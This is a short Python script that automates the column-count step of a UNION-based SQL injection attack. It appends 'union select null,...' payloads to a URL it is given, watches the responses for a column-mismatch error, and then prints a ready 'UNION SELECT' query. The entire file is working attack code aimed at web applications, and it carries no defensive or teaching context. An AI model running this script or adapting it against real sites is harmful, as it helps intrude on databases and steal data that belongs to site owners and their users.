import requests

url = input("Enter URL: ")
query = ''
column_count = 1

while True:
    res = requests.get(url + " union select " + "null,"*(column_count-1) + "null")
    if "different number of columns" not in res.text.lower():
        break
    
    column_count += 1

for i in range(1, column_count+1):
    if i == column_count:
        query += str(i)
    else:
        query += str(i) + ","
        
query = "UNION SELECT " + query

print("Total number of columns: ", column_count)
print("Final query:\n" + query)
